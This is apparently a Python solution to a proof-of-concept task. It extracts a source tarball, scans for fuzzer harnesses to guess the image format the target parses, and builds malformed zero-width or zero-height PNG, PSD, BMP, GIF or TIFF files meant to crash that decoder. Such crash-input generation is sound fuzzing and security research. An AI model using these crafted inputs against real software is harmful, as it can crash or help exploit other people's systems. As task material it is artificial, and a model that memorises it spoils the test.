import os
import re
import struct
import tarfile
import tempfile
import zlib
from typing import Dict, List, Optional, Tuple


def _is_tarfile(path: str) -> bool:
    try:
        return tarfile.is_tarfile(path)
    except Exception:
        return False


def _safe_read(path: str, limit: int = 200_000) -> bytes:
    try:
        with open(path, "rb") as f:
            return f.read(limit)
    except Exception:
        return b""


def _safe_read_text(path: str, limit: int = 200_000) -> str:
    return _safe_read(path, limit).decode("utf-8", errors="ignore")


def _extract_to_temp(src_path: str) -> str:
    if os.path.isdir(src_path):
        return src_path
    if not os.path.isfile(src_path):
        return src_path

    if not _is_tarfile(src_path):
        return src_path

    td = tempfile.mkdtemp(prefix="poc_src_")
    try:
        with tarfile.open(src_path, "r:*") as tf:
            def is_within_directory(directory: str, target: str) -> bool:
                abs_directory = os.path.abspath(directory)
                abs_target = os.path.abspath(target)
                return os.path.commonprefix([abs_directory, abs_target]) == abs_directory

            for m in tf.getmembers():
                name = m.name
                if not name or name.startswith("/") or ".." in name.replace("\\", "/").split("/"):
                    continue
                dest = os.path.join(td, name)
                if not is_within_directory(td, dest):
                    continue
                try:
                    tf.extract(m, td, set_attrs=False)
                except Exception:
                    pass
    except Exception:
        pass
    return td


def _find_fuzzer_sources(root: str, max_files: int = 3000) -> List[str]:
    exts = {".c", ".cc", ".cpp", ".cxx", ".c++"}
    fuzzers = []
    cnt = 0
    for dirpath, dirnames, filenames in os.walk(root):
        if cnt >= max_files:
            break
        dn = dirpath.lower()
        if any(x in dn for x in ("/.git", "\\.git", "/build", "\\build", "/out", "\\out", "/bazel-", "\\bazel-")):
            continue
        for fn in filenames:
            if cnt >= max_files:
                break
            cnt += 1
            p = os.path.join(dirpath, fn)
            _, ext = os.path.splitext(fn)
            if ext.lower() not in exts:
                continue
            tl = fn.lower()
            if "fuzz" in tl or "fuzzer" in tl:
                txt = _safe_read_text(p, 250_000)
                if "LLVMFuzzerTestOneInput" in txt:
                    fuzzers.append(p)
            else:
                txt = _safe_read_text(p, 250_000)
                if "LLVMFuzzerTestOneInput" in txt:
                    fuzzers.append(p)
    return fuzzers


def _score_format_from_text(text: str, name: str, scores: Dict[str, int]) -> None:
    t = text.lower()
    n = name.lower()

    def add(fmt: str, v: int) -> None:
        scores[fmt] = scores.get(fmt, 0) + v

    # Strong filename cues
    if "png" in n:
        add("png", 25)
    if "psd" in n:
        add("psd", 25)
    if "tiff" in n or "tif" in n:
        add("tiff", 22)
    if "bmp" in n:
        add("bmp", 22)
    if "gif" in n:
        add("gif", 22)
    if "pnm" in n or "ppm" in n or "pgm" in n or "pbm" in n:
        add("pnm", 18)
    if "jpeg" in n or "jpg" in n:
        add("jpeg", 18)
    if "ico" in n:
        add("ico", 15)
    if "webp" in n:
        add("webp", 15)
    if "avif" in n or "heif" in n:
        add("avif", 15)

    # Content cues
    if "llvmfuzzertestoneinput" in t:
        add("any", 1)

    # PNG cues
    if "#include <png.h>" in t or "png.h" in t:
        add("png", 18)
    if "ihdr" in t and "idat" in t and "iend" in t:
        add("png", 10)
    if "png_signature" in t or "png_sig" in t:
        add("png", 8)
    if "png_read_info" in t or "png_get_ihdr" in t:
        add("png", 12)
    if "lodepng" in t:
        add("png", 10)

    # PSD cues
    if "8bps" in t or "photoshop" in t or "psd" in t:
        add("psd", 10)

    # TIFF cues
    if "tiff" in t or "libtiff" in t:
        add("tiff", 10)
    if "tiffread" in t or "tiffopen" in t or "tiffclientopen" in t:
        add("tiff", 10)
    if "tiff.h" in t:
        add("tiff", 12)

    # BMP cues
    if "bitmap" in t or "dib" in t:
        add("bmp", 6)

    # GIF cues
    if "gif" in t or "giflib" in t:
        add("gif", 8)

    # Generic decoder cues
    if "stbi_load_from_memory" in t or "stb_image" in t or "stbi__" in t:
        add("png", 6)
        add("psd", 6)
        add("bmp", 6)
        add("gif", 6)
        add("pnm", 4)


def _score_format_from_tree(root: str, scores: Dict[str, int]) -> None:
    # Lightweight scan for distinctive files
    markers = [
        ("png", ["png.h", "png.c", "pngread", "pngdec", "lodepng"]),
        ("psd", ["psd", "8bps"]),
        ("tiff", ["tiff.h", "tiffio.h", "libtiff", "tif_"]),
        ("bmp", ["bmp", "bitmap"]),
        ("gif", ["gif_lib.h", "giflib", "gif"]),
        ("pnm", ["pnm", "ppm", "pgm", "pbm"]),
        ("jpeg", ["jpeglib.h", "libjpeg", "jpeg"]),
    ]

    max_files = 2500
    seen = 0
    for dirpath, dirnames, filenames in os.walk(root):
        if seen >= max_files:
            break
        dn = dirpath.lower()
        if any(x in dn for x in ("/.git", "\\.git", "/build", "\\build", "/out", "\\out", "/bazel-", "\\bazel-")):
            continue
        for fn in filenames:
            if seen >= max_files:
                break
            seen += 1
            fl = fn.lower()
            for fmt, pats in markers:
                for p in pats:
                    if p in fl:
                        scores[fmt] = scores.get(fmt, 0) + 1
                        break


def _infer_format(root: str) -> str:
    scores: Dict[str, int] = {}
    fuzzers = _find_fuzzer_sources(root)
    if fuzzers:
        for fp in fuzzers[:25]:
            txt = _safe_read_text(fp, 350_000)
            _score_format_from_text(txt, os.path.basename(fp), scores)
    else:
        # No explicit fuzzer found; sample some source files for hints
        sampled = 0
        for dirpath, dirnames, filenames in os.walk(root):
            if sampled >= 400:
                break
            dn = dirpath.lower()
            if any(x in dn for x in ("/.git", "\\.git", "/build", "\\build", "/out", "\\out", "/bazel-", "\\bazel-")):
                continue
            for fn in filenames:
                if sampled >= 400:
                    break
                if not fn.lower().endswith((".c", ".cc", ".cpp", ".cxx", ".h", ".hpp")):
                    continue
                sampled += 1
                fp = os.path.join(dirpath, fn)
                txt = _safe_read_text(fp, 120_000)
                _score_format_from_text(txt, fn, scores)

    _score_format_from_tree(root, scores)

    # Prefer formats with higher confidence; default to PNG
    candidates = ["png", "psd", "tiff", "bmp", "gif", "jpeg", "pnm", "ico", "webp", "avif"]
    best = "png"
    best_score = scores.get(best, 0)
    for c in candidates:
        sc = scores.get(c, 0)
        if sc > best_score:
            best = c
            best_score = sc

    return best


def _png_chunk(ctype: bytes, data: bytes) -> bytes:
    ln = struct.pack(">I", len(data))
    crc = zlib.crc32(ctype)
    crc = zlib.crc32(data, crc) & 0xFFFFFFFF
    return ln + ctype + data + struct.pack(">I", crc)


def gen_png_zero_width() -> bytes:
    sig = b"\x89PNG\r\n\x1a\n"
    width = 0
    height = 1
    bit_depth = 8
    color_type = 6  # RGBA
    ihdr = struct.pack(">IIBBBBB", width, height, bit_depth, color_type, 0, 0, 0)
    # One scanline: filter type 1 (Sub), with zero bytes of pixel data due to width=0
    raw = b"\x01"
    comp = zlib.compress(raw, 9)
    return sig + _png_chunk(b"IHDR", ihdr) + _png_chunk(b"IDAT", comp) + _png_chunk(b"IEND", b"")


def gen_psd_zero_width_rle() -> bytes:
    # Minimal PSD with width=0, height=1, RLE data that expands to at least 1 byte/channel
    sig = b"8BPS"
    version = struct.pack(">H", 1)
    reserved = b"\x00" * 6
    channels = struct.pack(">H", 3)
    height = struct.pack(">I", 1)
    width = struct.pack(">I", 0)
    depth = struct.pack(">H", 8)
    color_mode = struct.pack(">H", 3)  # RGB
    header = sig + version + reserved + channels + height + width + depth + color_mode

    def be_u32(x: int) -> bytes:
        return struct.pack(">I", x)

    sections = be_u32(0) + be_u32(0) + be_u32(0)  # color mode data len, image resources len, layer/mask len

    compression = struct.pack(">H", 1)  # RLE
    # Row lengths: channels * height entries, each 2 bytes big-endian
    # PackBits stream for 1 output byte: 0x00 <byte> (literal run of 1)
    rle_stream = b"\x00\x00"  # outputs one 0x00
    row_len = struct.pack(">H", len(rle_stream))
    row_lengths = row_len * 3  # 3 channels, 1 row each
    image_data = compression + row_lengths + (rle_stream * 3)
    return header + sections + image_data


def gen_bmp_zero_height() -> bytes:
    # Minimal BMP with height=0
    # BITMAPFILEHEADER (14) + BITMAPINFOHEADER (40) = 54 bytes
    width = 1
    height = 0
    bpp = 24
    row_size = ((width * bpp + 31) // 32) * 4  # 4 bytes for 1 pixel at 24bpp (padded)
    data_size = row_size * max(height, 1)  # keep some payload bytes
    off_bits = 54
    file_size = off_bits + data_size

    bf = b"BM" + struct.pack("<IHHI", file_size, 0, 0, off_bits)
    bi = struct.pack(
        "<IIIHHIIIIII",
        40,
        width & 0xFFFFFFFF,
        height & 0xFFFFFFFF,
        1,
        bpp,
        0,
        0,
        2835,
        2835,
        0,
        0,
    )
    # Add one row of data even though height=0
    pixel = b"\x00\x00\x00" + b"\x00"  # BGR + padding
    return bf + bi + pixel


def gen_gif_zero_width() -> bytes:
    # GIF89a with a single image descriptor width=0, height=1 and minimal LZW stream (clear, end)
    header = b"GIF89a"
    lsd = struct.pack("<HHBBB", 1, 1, 0xF0, 0, 0)  # 2-color global table
    gct = b"\x00\x00\x00" + b"\xFF\xFF\xFF"
    img_desc = b"\x2C" + struct.pack("<HHHHB", 0, 0, 0, 1, 0)
    lzw_min = b"\x02"
    # clear=4, end=5 with code size 3 => packed byte 0x2C
    img_data = b"\x01" + b"\x2C" + b"\x00"
    trailer = b"\x3B"
    return header + lsd + gct + img_desc + lzw_min + img_data + trailer


def gen_tiff_zero_width() -> bytes:
    # Minimal little-endian TIFF with ImageWidth=0, ImageLength=1, no pixel data.
    # Header: II *\x00, IFD at offset 8
    header = b"II*\x00" + struct.pack("<I", 8)

    entries = []

    def ifd_entry(tag: int, typ: int, count: int, value: int) -> bytes:
        return struct.pack("<HHII", tag, typ, count, value)

    # Tag constants
    TAG_ImageWidth = 256
    TAG_ImageLength = 257
    TAG_BitsPerSample = 258
    TAG_Compression = 259
    TAG_Photometric = 262
    TAG_StripOffsets = 273
    TAG_SamplesPerPixel = 277
    TAG_RowsPerStrip = 278
    TAG_StripByteCounts = 279

    TYPE_SHORT = 3
    TYPE_LONG = 4

    # We'll set StripOffsets to end of IFD structure, but no data follows; it's fine for many parsers.
    n = 9
    ifd_offset = 8
    ifd_end = ifd_offset + 2 + n * 12 + 4
    strip_offset_val = ifd_end

    entries.append(ifd_entry(TAG_ImageWidth, TYPE_LONG, 1, 0))
    entries.append(ifd_entry(TAG_ImageLength, TYPE_LONG, 1, 1))
    # SHORT stored in lower 2 bytes of value field
    entries.append(ifd_entry(TAG_BitsPerSample, TYPE_SHORT, 1, 8))
    entries.append(ifd_entry(TAG_Compression, TYPE_SHORT, 1, 1))
    entries.append(ifd_entry(TAG_Photometric, TYPE_SHORT, 1, 1))
    entries.append(ifd_entry(TAG_StripOffsets, TYPE_LONG, 1, strip_offset_val))
    entries.append(ifd_entry(TAG_SamplesPerPixel, TYPE_SHORT, 1, 1))
    entries.append(ifd_entry(TAG_RowsPerStrip, TYPE_LONG, 1, 1))
    entries.append(ifd_entry(TAG_StripByteCounts, TYPE_LONG, 1, 0))

    ifd = struct.pack("<H", n) + b"".join(entries) + struct.pack("<I", 0)
    return header + ifd


class Solution:
    def solve(self, src_path: str) -> bytes:
        root = _extract_to_temp(src_path)
        fmt = _infer_format(root)

        if fmt == "psd":
            return gen_psd_zero_width_rle()
        if fmt == "tiff":
            return gen_tiff_zero_width()
        if fmt == "bmp":
            return gen_bmp_zero_height()
        if fmt == "gif":
            return gen_gif_zero_width()
        # Default / common
        return gen_png_zero_width()